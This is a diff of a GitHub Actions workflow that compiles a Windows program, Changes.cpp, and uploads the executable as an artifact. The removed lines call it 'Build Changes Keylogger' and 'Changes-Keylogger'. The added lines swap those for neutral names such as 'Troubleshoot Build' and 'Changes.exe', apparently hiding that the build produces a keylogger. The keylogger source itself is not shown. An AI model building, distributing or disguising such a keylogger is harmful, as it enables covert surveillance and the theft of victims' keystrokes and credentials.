@@ -1,34 +1,57 @@
-name: Build Changes Keylogger
-on: [push, workflow_dispatch]
+name: Troubleshoot Build
+on: [workflow_dispatch]
 
 jobs:
-  compile:
+  troubleshoot:
     runs-on: windows-latest
     steps:
     - uses: actions/checkout@v3
-    - uses: ilammy/msvc-dev-cmd@v1
     
-    - name: Compile
+    - name: Check file exists
       run: |
+        echo "Checking Changes.cpp..."
+        if (Test-Path Changes.cpp) {
+          echo "✅ Changes.cpp found"
+          echo "First 3 lines:"
+          Get-Content Changes.cpp -TotalCount 3
+        } else {
+          echo "❌ Changes.cpp NOT found!"
+          dir
+        }
+    
+    - name: Setup compiler
+      uses: ilammy/msvc-dev-cmd@v1
+      
+    - name: Test simple compilation
+      run: |
+        echo "Testing with minimal code..."
+        # Create a test file
+        @"
+        #include <windows.h>
+        int main() { return 0; }
+        "@ | Out-File test.cpp -Encoding ASCII
+        
+        echo "Compiling test..."
+        cl test.cpp /Fetest.exe user32.lib
+        
+        if (Test-Path test.exe) {
+          echo "✅ Basic compilation works"
+        } else {
+          echo "❌ Basic compilation failed"
+        }
+    
+    - name: Compile your actual code
+      run: |
+        echo "Compiling Changes.cpp..."
         cl Changes.cpp ^
           /FeChanges.exe ^
           /O2 /MT ^
-          /D UNICODE /D _UNICODE ^
           winhttp.lib user32.lib shell32.lib ole32.lib gdi32.lib advapi32.lib ^
-          /nologo
+          2>&1
           
-    - name: Verify
-      run: |
-        if (Test-Path Changes.exe) {
-          echo "✅ Compilation successful!"
-          echo "File size: $((Get-Item Changes.exe).Length) bytes"
-        } else {
-          echo "❌ Compilation failed!"
-          exit 1
-        }
-        
-    - name: Upload
+    - name: Upload if successful
+      if: success()
       uses: actions/upload-artifact@v4
       with:
-        name: Changes-Keylogger
+        name: Changes.exe
         path: Changes.exe
